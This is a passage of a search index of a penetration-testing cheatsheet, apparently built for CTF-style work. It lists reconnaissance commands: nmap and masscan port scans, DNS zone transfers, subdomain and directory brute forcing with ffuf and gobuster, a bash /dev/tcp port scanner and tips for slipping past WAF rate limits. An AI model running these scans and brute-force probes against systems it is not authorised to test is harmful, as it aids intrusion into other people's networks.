{"0": {
    "doc": "ftf-hacksheet",
    "title": "Cheatsheets",
    "content": " ",
    "url": "http://localhost:4000/#cheatsheets",
    "relUrl": "/#cheatsheets"
  },"1": {
    "doc": "ftf-hacksheet",
    "title": "Cheat.sh",
    "content": ". | Site - CLI, local and online cheatsheet:# Single query cht.sh go reverse a list # Interactive mode cht.sh --shell go reverse a list # Tool specific search cd go reverse a list # Copy last result without comments ccopy # Search /~&lt;keyword&gt; # One level search /~&lt;keyword&gt;/i # One level insensitive /~&lt;keyword&gt;/b # One level word-bound /~&lt;keyword&gt;/r # Recursive search # Auto-query using clipboard changes stealth # Add Q for commands-only . | . ",
    "url": "http://localhost:4000/#cheatsheets--cheat-sh",
    "relUrl": "/#cheatsheets--cheat-sh"
  },"2": {
    "doc": "ftf-hacksheet",
    "title": "tldr",
    "content": ". | Site - CLI - Simplified man pages:tldr &lt;tool&gt; . | . ",
    "url": "http://localhost:4000/#cheatsheets--tldr",
    "relUrl": "/#cheatsheets--tldr"
  },"3": {
    "doc": "ftf-hacksheet",
    "title": "Network Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration",
    "relUrl": "/#network-enumeration"
  },"4": {
    "doc": "ftf-hacksheet",
    "title": "IP",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ip",
    "relUrl": "/#network-enumeration--ip"
  },"5": {
    "doc": "ftf-hacksheet",
    "title": "Find External IP",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-external-ip",
    "relUrl": "/#network-enumeration--ip--find-external-ip"
  },"6": {
    "doc": "ftf-hacksheet",
    "title": "Dig",
    "content": ". | By querying Google&#8217;s NS:dig TXT +short o-o.myaddr.l.google.com @ns1.google.com . | . ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-external-ip--dig",
    "relUrl": "/#network-enumeration--ip--find-external-ip--dig"
  },"7": {
    "doc": "ftf-hacksheet",
    "title": "openssl s_client",
    "content": ". | By asking ipecho.net:echo -ne \"GET /plain HTTP/1.0\\r\\nHost: ipecho.net\\r\\n\\r\\n\" | openssl s_client -connect ipecho.net:443 -verify_quiet -quiet 2&gt;/dev/null | sed -n '${G;P}' . | . ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-external-ip--openssl-s_client",
    "relUrl": "/#network-enumeration--ip--find-external-ip--openssl-s_client"
  },"8": {
    "doc": "ftf-hacksheet",
    "title": "Find Internal IP",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-internal-ip",
    "relUrl": "/#network-enumeration--ip--find-internal-ip"
  },"9": {
    "doc": "ftf-hacksheet",
    "title": "Local Subnet",
    "content": "sed -n '/[[:digit:]]/{:a;N;/LOCAL/!{D;ba};/ 127.0.0/d;s/^[^[:digit:]]*\\|.\\n.*//gp;q}' /proc/net/fib_trie . ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-internal-ip--local-subnet",
    "relUrl": "/#network-enumeration--ip--find-internal-ip--local-subnet"
  },"10": {
    "doc": "ftf-hacksheet",
    "title": "Get the eth0 Gateway",
    "content": "# TODO - Modify to use in scripts awk '/eth0/&amp;&amp;$3{split($3,a,\"\");while(i++&lt;8)printf\"%d.\",\"0x\"a[9-++i]a[10-i];print\"\\b \";exit}' /proc/net/route . ",
    "url": "http://localhost:4000/#network-enumeration--ip--find-internal-ip--get-the-eth0-gateway",
    "relUrl": "/#network-enumeration--ip--find-internal-ip--get-the-eth0-gateway"
  },"11": {
    "doc": "ftf-hacksheet",
    "title": "DNS and Hostnames",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames",
    "relUrl": "/#network-enumeration--dns-and-hostnames"
  },"12": {
    "doc": "ftf-hacksheet",
    "title": "Domain Resolution",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--domain-resolution",
    "relUrl": "/#network-enumeration--dns-and-hostnames--domain-resolution"
  },"13": {
    "doc": "ftf-hacksheet",
    "title": "Perl",
    "content": ". | Core Perl - IPv4perl -MSocket -E 'say+inet_ntoa+inet_aton\"&lt;domain&gt;\"' . | Core Perl - IPv6perl -mSocket -E '$_?say+Socket::inet_ntop+10,unpack+x8a16,$$_{addr}:\"\"for+Socket::getaddrinfo\"&lt;domain&gt;\",\"\",{socktype,3,family,10}' # See below the meaning of magic numbers . | Core Perl - Reverse Resolution# Use AF_INET6 for IPv6 perl -MSocket -E '$_?say+Socket::getnameinfo$$_{addr},\"\",Socket::NIx_NOSERV:\"\"for+Socket::getaddrinfo\"&lt;ip&gt;\",\"\",{socktype,SOCK_RAW,flags,Socket::AI_NUMERICHOST,family,AF_INET4}' . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--domain-resolution--perl",
    "relUrl": "/#network-enumeration--dns-and-hostnames--domain-resolution--perl"
  },"14": {
    "doc": "ftf-hacksheet",
    "title": "Sub-Network Resolution",
    "content": ". | Locate all possible DNS servers in the network:# Use -sS for alternate TCP scan # Maybe use 54,443 in a second round nmap -sU -sV --open --reason -T4 --min-rate=1000 -Pn -oG dns.grep -p 53,5353 10.0.0.1/24 . | Find which of the possible DNSs obtained before are legit and their hostname:# Replace -U with -T for TCP ports # Change -W &lt;timeout&gt; and -P &lt;procs&gt; # if unreliable results awk '/\\/open/{gsub(\" [0-9]+\", \"&amp; \" $2 \" \" $2 \"\\n\"); gsub(\"/open[^,]*,?|.*Ports:\",\"\"); print}' dns.grep | xargs -n 3 -P 0 -- host -U -W1 -p | awk '!/timed out|^$|end of file/; /arpa/{print \"\"}' | tee dnses.txt . | Find the domain names of all the machines in the network using the detected DNS (machines without a name won&#8217;t be listed):# Reminder: test TCP DNSs with -T awk -F' |#' '/#/{print $2, $3}' dnses.txt | while read dns port; do seq 254 | xargs -I{} -P 0 -- host -U -W1 -p${port} \"${dns%.*}\".{} ${dns}; done | sed -n '/domain name/{s/\\([0-9]\\+\\.\\)\\([0-9]\\+\\.\\)\\([0-9]\\+\\.\\)\\([0-9]\\+\\.\\)/\\4\\3\\2\\1/;s/\\.in.* \\|\\.$/ /gp}' | sort -t. -k4 -nu | column -t . | Obtain the hostname of a Domain Controller with nslookup:nslookup set type=all _ladp._tcp.dc._msdcs.&lt;domain&gt; . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--sub-network-resolution",
    "relUrl": "/#network-enumeration--dns-and-hostnames--sub-network-resolution"
  },"15": {
    "doc": "ftf-hacksheet",
    "title": "Zone Transfer",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer"
  },"16": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | Attempt to perform them especially if there are servers with TCP port 53 (or 5353) open | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer--notes",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer--notes"
  },"17": {
    "doc": "ftf-hacksheet",
    "title": "Identify",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer--identify",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer--identify"
  },"18": {
    "doc": "ftf-hacksheet",
    "title": "Host",
    "content": ". | Address complete lookup:# Non-standard port with -p &lt;port&gt; host -t ANY &lt;ip&gt; [&lt;dns&gt;] # -t NS to only show nameservers # Using the \"all\" flag host -a &lt;ip&gt; [&lt;dns&gt;] . | List all the records in the zone:host -l -t ANY &lt;hostname&gt; [&lt;dns&gt;] # -t NS to only show nameservers # Using the \"all\" flag host -l -a &lt;hostname&gt; [&lt;dns&gt;] . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer--identify--host",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer--identify--host"
  },"19": {
    "doc": "ftf-hacksheet",
    "title": "NSlookup",
    "content": ". | Hostname resolution:nslookup server &lt;dns&gt; &lt;ip&gt; # Hostname returned . | List all the records in the zone:nslookup server &lt;dns&gt; set q=any # Also try: set type=NS &lt;hostname&gt; . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup"
  },"20": {
    "doc": "ftf-hacksheet",
    "title": "Dig",
    "content": ". | Hostname resolution:# Add +search to read resolv.conf dig @&lt;dns&gt; &lt;ip&gt; # Add +short for compact output # Reverse resolution dig @&lt;dns&gt; -x &lt;ip&gt; . | ANY details:# Add +tcp or +notcp to use TCP/UDP dig @&lt;dns&gt; -4 &lt;ipv4&gt; ANY +nocmd +recurse +unexpected +fail +additional # Use NS to show nameservers only # Add +nssearch to search for names . | Perform Zone Transfer:# Can use -q &lt;hostname&gt; instead dig @&lt;dns&gt; &lt;hostname&gt; AXFR # Can use -t AXFR instead . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--zone-transfer--identify--dig",
    "relUrl": "/#network-enumeration--dns-and-hostnames--zone-transfer--identify--dig"
  },"21": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--bruteforce",
    "relUrl": "/#network-enumeration--dns-and-hostnames--bruteforce"
  },"22": {
    "doc": "ftf-hacksheet",
    "title": "Dictionaries",
    "content": ". | Use the SecLists: . | top1million | bitquark | deepmagic | . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--bruteforce--dictionaries",
    "relUrl": "/#network-enumeration--dns-and-hostnames--bruteforce--dictionaries"
  },"23": {
    "doc": "ftf-hacksheet",
    "title": "Ffuf",
    "content": ". | Site - Most flexible fuzzer:ffuf -u https://FUZZ.&lt;domain&gt; -c -ac -w &lt;domlist&gt; # Use -s to only show results # See URL Enumeration for more info # vhost discovery ffuf -u https://&lt;ip&gt; -H \"Host: FUZZ.&lt;domain&gt;\" -c -ac -w &lt;domlist&gt; # Don't forget to also try HTTP . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--bruteforce--ffuf",
    "relUrl": "/#network-enumeration--dns-and-hostnames--bruteforce--ffuf"
  },"24": {
    "doc": "ftf-hacksheet",
    "title": "Gobuster",
    "content": ". | Site - Dir/File/DNS/VHost fuzzer:gobuster dns -t 30 -d &lt;domain&gt; -w &lt;wlist&gt; # Use -z to hide the progress with # See URL Enumeration for more info . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--bruteforce--gobuster",
    "relUrl": "/#network-enumeration--dns-and-hostnames--bruteforce--gobuster"
  },"25": {
    "doc": "ftf-hacksheet",
    "title": "Hosts",
    "content": ". | Those domains found in certificates without DNSs to resolve shall be added to /etc/hosts:&lt;ip&gt; &lt;hostname1&gt; &lt;hostname2&gt;... | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--hosts",
    "relUrl": "/#network-enumeration--dns-and-hostnames--hosts"
  },"26": {
    "doc": "ftf-hacksheet",
    "title": "Change DNS",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--change-dns",
    "relUrl": "/#network-enumeration--dns-and-hostnames--change-dns"
  },"27": {
    "doc": "ftf-hacksheet",
    "title": "Systemd-resolved",
    "content": ". | Add new DNS and domain:# Add DNS resolvectl dns &lt;iface&gt; &lt;dns-ip&gt; # State domains to resolve resolvectl domain &lt;iface&gt; &lt;domain&gt; # Domain can be \"local\", \"htb\", etc . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--change-dns--systemd-resolved",
    "relUrl": "/#network-enumeration--dns-and-hostnames--change-dns--systemd-resolved"
  },"28": {
    "doc": "ftf-hacksheet",
    "title": "Resolv.conf",
    "content": ". | Note that I couldn&#8217;t get this to work, maybe because of a lack of search &lt;domain&gt; before nameserver | Add new DNS:# Note that resolv.conf gets edited # by nm, resolvconf, etc echo 'nameserver &lt;dns-ip&gt;' &gt;&gt; /etc/resolv.conf # Note that options are usually # required to resolve with all DNSs . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--change-dns--resolv-conf",
    "relUrl": "/#network-enumeration--dns-and-hostnames--change-dns--resolv-conf"
  },"29": {
    "doc": "ftf-hacksheet",
    "title": "NetworkManager",
    "content": ". | Note that I couldn&#8217;t get this to work, maybe because I didn&#8217;t specify the domain to be searched by the conn | Add new DNS and DNS options:# Find &lt;connection-name&gt; nmcli con show # Add DNS nmcli con mod &lt;connection-name&gt; +ipv4.dns \"&lt;dns-ip&gt;\" # Add DNS options nmcli con mod &lt;connection-name&gt; +ipv4.dns-options rotate nmcli con mod &lt;connection-name&gt; +ipv4.dns-options timeout:1 nmcli con mod &lt;connection-name&gt; +ipv4.dns-options retries:1 # Reload connection nmcli con reload &lt;connection-name&gt; . | . ",
    "url": "http://localhost:4000/#network-enumeration--dns-and-hostnames--change-dns--networkmanager",
    "relUrl": "/#network-enumeration--dns-and-hostnames--change-dns--networkmanager"
  },"30": {
    "doc": "ftf-hacksheet",
    "title": "Ping",
    "content": ". | Batch ping-sweep:for /L %i in (1,1,255) do @ping -n 1 -w 200 10.0.0.%i &gt; nul &amp;&amp; echo 10.0.0.%i is up . | . ",
    "url": "http://localhost:4000/#network-enumeration--ping",
    "relUrl": "/#network-enumeration--ping"
  },"31": {
    "doc": "ftf-hacksheet",
    "title": "Ports",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ports",
    "relUrl": "/#network-enumeration--ports"
  },"32": {
    "doc": "ftf-hacksheet",
    "title": "Scan",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ports--scan",
    "relUrl": "/#network-enumeration--ports--scan"
  },"33": {
    "doc": "ftf-hacksheet",
    "title": "Nmap",
    "content": ". | Quick TCP - Top 100 ports - SYN Scan:# -T&lt;0-5&gt; Timing of the scan # -T0 -&gt; slowest | -T5 fastest # Improve results by lowering -T # -T4 is good enough for fast networks # -T3 is the default # -T2 and less for cautious # Figuring --min-rate is a priority # Use --max-rate 5 if WAF blocks IP with # --scan-delay 5ms --max-scan-delay 6ms # -sT for CONNECT scan # Ignore Windows ports above 49152 # Remove -n to resolve &lt;hostname&gt; nmap -sS -n -sV -Pn --open --reason -T4 --min-rate=5000 --top-ports=100 -oG &lt;name&gt;-100-tcp.gnmap &lt;ip/hostname&gt; # Try CONNECT scan if no results . | Full TCP - all ports - SYN Scan:# -sT for CONNECT scan nmap -sS -n -sV -Pn --open --reason -T4 --min-rate=5000 -p- -oG &lt;name&gt;-all-tcp.gnmap &lt;ip/hostname&gt; # Try CONNECT scan if no results . | Quick UDP - Top 50 ports:# --min-rate is always less for UDP nmap -sU -n -sV -Pn --open --reason -T4 --min-rate=1000 --top-ports=50 -oG &lt;name&gt;-50-udp.gnmap &lt;ip/hostname&gt; # If only open|filtered: # Remove -sV unless scan was fast . | Print hosts with their open ports using nmap grep output:awk '/\\/open/{gsub(\"/open[^,]*,?\",\"\"); match($0,\"[0-9 ]+$\"); print $2 substr($0,RSTART)}' &lt;scan&gt;.gnmap . | Update scripts:nmap --script-updatedb . | Default scripts + Deep fingerprint:# -sT for CONNECT scan # -sU for UDP scan # Provide both -sS and -sU along # with -p U:&lt;udp-port&gt;,T:&lt;tcp-port&gt; nmap -sS -n -sV -sC -A --open --reason -Pn -T4 --min-rate=1000 -p&lt;ports&gt; &lt;ip/hostname&gt; . | Vulnerable scripts:# -sT for CONNECT scan # -sU for UDP scan # Provide both -sS and -sU along # with -p U:&lt;udp-port&gt;,T:&lt;tcp-port&gt; nmap -sS -n -sV --open -Pn -T4 --min-rate=1000 --script=vuln -p&lt;ports&gt; &lt;ip/hostname&gt; # Vuln scripts not in the vuln pack nmap -sS -n -sV --open -Pn -T4 --min-rate=1000 --script=\\*vuln\\* -p&lt;ports&gt; &lt;ip/hostname&gt; . | ? ports accessible with netcat:# Note how long it takes nc to conn time nc -nv &lt;ip&gt; &lt;port&gt; # echo quit | time nc ... to measure # Edit nmap/nmap-service-probes locate nmap-service-probes # Set totalwaitms to the nc time # Also alter the NSE scripts timeout # or add the appropriate script-args nmap -sS -n -sV -sC --open -Pn -T4 --min-rate=1000 -p&lt;?ports&gt; &lt;ip/hostname&gt; # --script-timeout=&lt;t&gt; ends after t . | Full UDP - all ports - Really slow:# Only use -sV with open ports nmap -sU -n -Pn --open --reason -T4 --min-rate=1000 -p- -oG &lt;name&gt;-all-udp.gnmap &lt;ip/hostname&gt; . | Segmented scan over SOCKS tunnel:# Using tun2socks for improvement sudo -v; seq 100 100 65535 | while read ports; do sudo nmap -sS -n -sV -Pn --open --reason -T4 --min-rate=5000 -p$((ports - 100))-$ports -oG tun-100-tcp.gnmap -e tun10 &lt;ip&gt; 2&gt;&amp;1; cat tun-100-tcp.gnmap &gt;&gt; tun-all-tcp.gnmap; sleep 2; done | stdbuf -i0 -o0 awk '/open/ &amp;&amp; !/tcpwrapped/' | tee out.nmap # chisel was used as SOCKS mechanism . | . ",
    "url": "http://localhost:4000/#network-enumeration--ports--scan--nmap",
    "relUrl": "/#network-enumeration--ports--scan--nmap"
  },"34": {
    "doc": "ftf-hacksheet",
    "title": "Masscan",
    "content": ". | Install the Zero Copy driver if your card supports it and check for it:# Check if the driver is identified masscan --iflist # If your iface has the PFRING id # you can add the --pfring flag # To the scans . | Scan all TCP ports:masscan -e &lt;iface&gt; --rate=5000 -p1-65535 --interactive -oG &lt;name&gt;-all-tcp.gmscan &lt;ip/hostname&gt; # You can add --retry 2 or lower the # rate to make it more accurate . | Scan all UDP ports:masscan -e &lt;iface&gt; --rate=1000 -pU:1-65535 --interactive -oG &lt;name&gt;-all-udp.gmscan &lt;ip/hostname&gt; . | Print hosts with their open ports using masscan grep output:sort -k4 &lt;scan&gt;.gmscan | awk -F'\\\\s|/' '/open/{if(ip != $4){if(ip){print \"\"};ip=$4;p=ip}; printf \"%s %s\", p, $7; p=\"\"} END{print \"\"}' . | . ",
    "url": "http://localhost:4000/#network-enumeration--ports--scan--masscan",
    "relUrl": "/#network-enumeration--ports--scan--masscan"
  },"35": {
    "doc": "ftf-hacksheet",
    "title": "Bash",
    "content": ". | Find open ports using bash:seq 65535 | xargs -I {} timeout .2 bash -c \": &gt; /dev/tcp/10.0.0.1/{}; echo {}\" . | . ",
    "url": "http://localhost:4000/#network-enumeration--ports--scan--bash",
    "relUrl": "/#network-enumeration--ports--scan--bash"
  },"36": {
    "doc": "ftf-hacksheet",
    "title": "Banners",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--ports--banners",
    "relUrl": "/#network-enumeration--ports--banners"
  },"37": {
    "doc": "ftf-hacksheet",
    "title": "Netcat",
    "content": ". | Grab the banners and interact with the service:# Add -C for adding carriage return nc -nv &lt;ip&gt; &lt;port&gt; . | . ",
    "url": "http://localhost:4000/#network-enumeration--ports--banners--netcat",
    "relUrl": "/#network-enumeration--ports--banners--netcat"
  },"38": {
    "doc": "ftf-hacksheet",
    "title": "Traffic Capture",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--traffic-capture",
    "relUrl": "/#network-enumeration--traffic-capture"
  },"39": {
    "doc": "ftf-hacksheet",
    "title": "tcpdump",
    "content": ". | Capture all traffic from an iface:# Filter to a given ip + port exclude tcpdump -i &lt;iface&gt; host &lt;ip&gt; and not tcp port &lt;port&gt; . | Detect remote open ports if a firewall is in the way with ncat:# In remote machine (also -u for UDP) seq 65535 | xargs -P 0 -I{} ncat -p {} -w 1 &lt;lip&gt; &lt;lport&gt; 2&gt;/dev/null # &lt;lip&gt; is the machine with tcpdump . | The same can be achieved with socat using SOCKS/TCP4 with sourceport=port, socksport=port, or bind=:&lt;port&gt;, and maybe reuseaddr - TODO | . ",
    "url": "http://localhost:4000/#network-enumeration--traffic-capture--tcpdump",
    "relUrl": "/#network-enumeration--traffic-capture--tcpdump"
  },"40": {
    "doc": "ftf-hacksheet",
    "title": "Website / URL",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url",
    "relUrl": "/#network-enumeration--website---url"
  },"41": {
    "doc": "ftf-hacksheet",
    "title": "Discovery",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery",
    "relUrl": "/#network-enumeration--website---url--discovery"
  },"42": {
    "doc": "ftf-hacksheet",
    "title": "Nmap",
    "content": ". | nmap --script=http-enum | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--nmap",
    "relUrl": "/#network-enumeration--website---url--discovery--nmap"
  },"43": {
    "doc": "ftf-hacksheet",
    "title": "Dirhunt",
    "content": ". | Site - Interesting files (Flags):# Int files: -f &lt;file1&gt;,&lt;file2&gt;... # Int extensions: -e &lt;php&gt;,&lt;js&gt;... dirhunt --limit 0 http://&lt;ip&gt;/ # Exclude -x &lt;flags&gt;: # -x http,not_found,index_of,300-500 . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--dirhunt",
    "relUrl": "/#network-enumeration--website---url--discovery--dirhunt"
  },"44": {
    "doc": "ftf-hacksheet",
    "title": "gospider",
    "content": ". | Site - Fast spider written in go:# Crawl dom+subdomains indefinetely gospider -s &lt;url&gt; -d 0 --sitemap -w # --json - JSON output . | Non-duplicated sites clean output - proxygospider -s &lt;url&gt; -p http://&lt;proxy:p&gt; -d 0 --sitemap -w | awk '!x[$NF]++{print $NF}' # Filter -&gt; Prepend /&lt;site&gt;/&amp;&amp; to awk . | Or with json + cookies - no subdomains:gospider -s &lt;url&gt; --cookie 'a=b; c=d' -d 0 --sitemap --json | jq -r '.output' | awk '!x[$0]++' # --whitelist-domain=&lt;regex&gt; - Dom only . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--gospider",
    "relUrl": "/#network-enumeration--website---url--discovery--gospider"
  },"45": {
    "doc": "ftf-hacksheet",
    "title": "Photon",
    "content": ". | Site - OSINT crawler (stdout values):# Crawl site - show same-domain URL: photon.py -u 'http://&lt;ip-hostname&gt;' --only-urls -t 5 -l 999 --stdout=internal # Exclude: --exclude='/manual[1|2]' # Scrap content based on regex: photon.py -u 'http://&lt;ip-hostname&gt;' -t 5 -l 999 --stdout=custom -r 'https?://[A-z0-9\\._\\/\\-?=]+' # Find high entropy secrets: photon.py -u 'http://&lt;ip-hostname&gt;' -t 5 -l 999 --keys --stdout=keys # Check &lt;ip-hostname&gt;/{intel,files} # Locally clone the site: photon.py -u 'http://&lt;ip-hostname&gt;' -t 5 -l 999 --clone # Check --ninja and --wayback flags . | For self-signed certs errors, find all instances of requests.get() and add , verify=False as last param - Ref# Execute in the Photon folder grep -r 'requests.get(' | cut -d: -f1 | xargs -I{} sed -i 's/\\(requests.get(.*\\)\\([,)]\\)/\\1, verify=False\\2/' {} . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--photon",
    "relUrl": "/#network-enumeration--website---url--discovery--photon"
  },"46": {
    "doc": "ftf-hacksheet",
    "title": "Maryam",
    "content": ". | Site - OSINT Data collector Framework:# Extract based on regex maryam -e crawl_pages -d &lt;ip-host&gt; -r 'https?://[A-z0-9\\._\\/\\-?=]+' --thread 5 --limit 999 --more # Check the --wayback flag # Use crawler to simply crawl . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--maryam",
    "relUrl": "/#network-enumeration--website---url--discovery--maryam"
  },"47": {
    "doc": "ftf-hacksheet",
    "title": "Evine",
    "content": ". | Site - Interactive Web Crawler:# Press Enter &amp; Ctrl+Space to search evine -robots -sitemap -depth 999 -url http://&lt;ip-hostname&gt; # Tab move | CtrlS save | CtrlZ exit # Query field &lt;ext&gt; # Show all files.&lt;ext&gt; all # Show all findings url # Show in-scope URLs all_urls # Out-scope URLs query_urls # In-scope URLs with ?q= script/css # JavaScript/CSS files cdn # CDN files comment # HTML comments media # Non-web files: PNG, ZIP phone # Phone numbers from href email # In/Out-scope emails network # Social Media IDs/links dns # Subdomains of the site &lt;jquery&gt; # Obtain selector content # Example: $(\"a\").attr(\"href\") . | JQuery selector methods | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--evine",
    "relUrl": "/#network-enumeration--website---url--discovery--evine"
  },"48": {
    "doc": "ftf-hacksheet",
    "title": "Wappalyzer",
    "content": ". | Site/npm - Identify Web Technologies:# -a &lt;User-Agent&gt; | -P Pretty JSON wappalyzer &lt;url&gt; -p -r -P # -D/-m Max depth/urls . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--wappalyzer",
    "relUrl": "/#network-enumeration--website---url--discovery--wappalyzer"
  },"49": {
    "doc": "ftf-hacksheet",
    "title": "Arjun",
    "content": ". | Site - HTTP parameters discoveryarjun -u '&lt;url&gt;' # -i &lt;file&gt; - Multiple URLs # -m &lt;method&gt; - GET/POST/XML/JSON # --stable - Use when unstable # --passive [] - Use Wayback, etc # -w &lt;file&gt; - Use custom wordlist # -oB [&lt;port&gt;] - Proxy to Burp . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--discovery--arjun",
    "relUrl": "/#network-enumeration--website---url--discovery--arjun"
  },"50": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url--bruteforce",
    "relUrl": "/#network-enumeration--website---url--bruteforce"
  },"51": {
    "doc": "ftf-hacksheet",
    "title": "Dictionaries",
    "content": ". | Use the SecLists: . | common.txt | RobotsDisallowed-Top1000.txt | Logins.fuzz.txt | Passwords.fuzz.txt | Common-DB-Backups.txt | quickhits.txt | dirsearch.txt | big.txt | . | onelistforallmicro.txt as extra | All in one without repeats:awk '!x[$0]++' *.txt &gt; all.txt # Order not preserved sort -u *.txt &gt; all.txt . | Separate non-extensions vs extensions:grep -v '%EXT%' all.txt &gt; no-ext-all.txt grep '%EXT%' all.txt &gt; ext-all.txt . | Or all without repeats and %EXT%:awk '{gsub(/\\.?%EXT%\\.?/,\"\")}!x[$0]++' *.txt &gt; all.txt # sed+sort variant - order not preserved sed 's/\\.\\?%EXT%\\.\\?//' *.txt | sort -u &gt; all.txt . | Followed by some Web App/Server specific (Windows/Linux, IIS/Apache&#8230;) + dirb ones . | Apache: . | Apache.fuzz.txt | ApacheTomcat.fuzz.txt | apache.txt | tomcat.txt | . | IIS: . | iisfinal.txt | . | . | Remove previously used items from dict:# Using bash/zsh pipes comm -23 &lt;new-dup&gt; &lt;(sort -u &lt;old-1&gt; &lt;old-2&gt;) &gt; &lt;new-clean&gt; . | If case is ignored, lowercase all:tr '[:upper:]' '[:lower:]' &lt; &lt;dict&gt; . | Remove leading slashes if duplicates:sed 's,^/\\+,,' &lt;dict&gt; . | Check the behavior of trailing slashes . | If some dirs with slashes return 40x errors but are redirected without them, remove them all:sed 's,/\\+$,,' &lt;dict&gt; . | If only trailing slashes identify dirs, append a slash to items without .ext:sed 's,/\\+$,,;/\\..\\+$/!s,$,/,' &lt;dict&gt; . | If some/all dirs without slashes get redirected, duplicate all with both:sed '/\\/\\+$/{p;s///}' &lt;dict&gt; . | . | Use such rules with the following dictionaries as the next step: . | onelistforallshort.txt | raft-large-dirs.txt (lowercase) | raft-large-files.txt (lowercase) | . | Use dirs-big.txt as ext template for html, txt, conf + jsp/php/cgi or run: . | raft-large-extensions.txt (lower) | web-extensions.txt | . | Make dirsearch %EXT% compatible:sed '/\\..\\+$/!{s,/\\+$,,;s,$,%EXT%,;}' . | Make dirsearch %NOFORCE% compatible:sed '/\\..\\+$/s,$,%NOFORCE%,' . | You may want to go back to nmap and execute all the *vuln* scripts and those Web App/Server specific before continuing | As last resort (+ lowercase versions): . | ProbableWL &lt;- Only random sites | rockyou.txt &lt;- Only random sites | OneListForAll &lt;- Desperate | all-wordlist.txt | . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--bruteforce--dictionaries",
    "relUrl": "/#network-enumeration--website---url--bruteforce--dictionaries"
  },"52": {
    "doc": "ftf-hacksheet",
    "title": "Ffuf",
    "content": ". | Site - Most flexible fuzzer (Ref):# FUZZ will be the param subtituted ffuf -u &lt;url&gt;/FUZZ -c -ac -ic -w &lt;wlist&gt; # -c - color # -ac - Auto-calibrate filters # -ic - Ignore comments in &lt;wlist&gt; # # -r - Follow redirects # -ignore-body - Don't fetch body # -acc &lt;str&gt; - Custom-auto-calibrate # -t &lt;threads&gt; - 40 by default # -s - Silent mode - results only # -v - Full URLs and redirects # -o &lt;file&gt; - Save results to file # -or - Don't create file if empty # -of &lt;output-format&gt; - json/md/csv # -od &lt;output-directory&gt; # # &lt;ENTER&gt; to enter interactive-mode # help | resume/ENTER | [queue]show # fc/fl/fw/fs &lt;value&gt; | restart # # -noninteractive - Disable int-mode # Fuzz rate limited with variable delay ffuf -u &lt;url&gt;/FUZZ -t 4 -p '0.5-0.6' -rate 5 -c -ac -ic -w &lt;wlist&gt; # -p &lt;delay&gt; - Fixed or variable # Fuzz multiple domains ffuf -u 'https://DOM/WLIST' -ac -sf -c -w &lt;domlist&gt;:DOM -w &lt;wlist&gt;:WLIST # -sf - Stop when HTTP 403 &gt; 95% # Fuzz params with reflective match ffuf -u &lt;url&gt;/?PARAM=VAL -mr \"VAL\" -c -w &lt;paramlist&gt;:PARAM,&lt;valist&gt;:VAL # -m pitchfork - Try same line wlist # Line 1 param -&gt; Line 1 val # Line 2 param -&gt; Line 2 val... # Fuzz extensions recursively ffuf -u &lt;url&gt;/FUZZ -c -ic -w &lt;wlist&gt; -recursion -e .bak,.zip # -D - DirSearch advanced exts mode # -recursion-strategy default/greedy # Fuzz headers - Custom Auto-filter ffuf -u &lt;url&gt; -c -w &lt;vhostlist&gt; -acc 'www' -H 'Host: FUZZ.&lt;domain&gt;' # Fuzz cookies through a proxy ffuf -u &lt;url&gt; -w &lt;wlist&gt; -x 